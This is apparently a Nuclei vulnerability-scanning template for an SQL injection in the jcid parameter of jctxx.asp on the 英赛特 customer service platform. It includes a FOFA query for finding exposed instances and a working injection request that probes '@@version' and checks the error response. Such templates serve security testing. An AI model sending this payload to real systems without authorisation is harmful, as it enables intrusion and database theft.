id: insite-service-platform-jctxx-jcid-sqli

info:
  name: "英赛特 jctxx.asp jcid 参数 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="inc/js/pngfix.js" && body="英赛特"
      该漏洞源于英赛特互联网客户服务平台在 jctxx.asp 文件处理 jcid 参数时未正确过滤特殊字符，攻击者可通过构造恶意 SQL 语句实现数据库查询操控，可能导致敏感数据泄露或持久化注入攻击。
  tags: 英赛特互联网客户服务平台

http:
- raw:
  - |
    GET /csccmise/jctxx.asp?jcid=@@version  HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'Microsoft'
